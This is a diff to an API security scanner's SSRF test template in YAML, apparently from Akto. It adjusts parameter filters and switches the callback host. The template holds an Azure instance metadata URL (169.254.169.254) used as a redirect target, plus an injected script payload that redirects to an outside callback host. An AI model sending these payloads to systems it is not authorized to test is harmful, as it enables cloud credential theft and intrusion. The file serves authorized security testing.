@@ -55,13 +55,15 @@ api_selection_filters:
     - request_payload:
         for_one:
           key:
-            regex: .*
             extract: param_key
+          value:
+            datatype: string
     - query_param:
         for_one:
           key:
-            regex: .*
             extract: param_key
+          value:
+            datatype: string
 wordLists:
   redirect_urls:
     - http://169.254.169.254/metadata/instance/compute?api-version=2021-01-01&amp;format=json
@@ -74,14 +76,14 @@ execute:
     - req:
         - add_header:
             Metadata: true
-    	  - send_ssrf_req:
-       		  url: "http://ssrf.akto.io/store_uuid/${random_uuid}"
-       		  redirect_url: ${redirect_urls}
+        - send_ssrf_req:
+            url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+            redirect_url: ${redirect_urls}
         - follow_redirect: true
         - modify_query_param:
-            file_key: "<script> window.location=\"https://ssrf.akto.io/${random_uuid}\";</script>"
+            param_key: "<script> window.location=\"https://test-services.akto.io/store_uuid/${random_uuid}\";</script>"
         - modify_body_param:
-            file_key: "<script> window.location=\"https://ssrf.akto.io/${random_uuid}\";</script>"
+            param_key: "<script> window.location=\"https://test-services.akto.io/store_uuid/${random_uuid}\";</script>"
 
 validate:
   response_code:
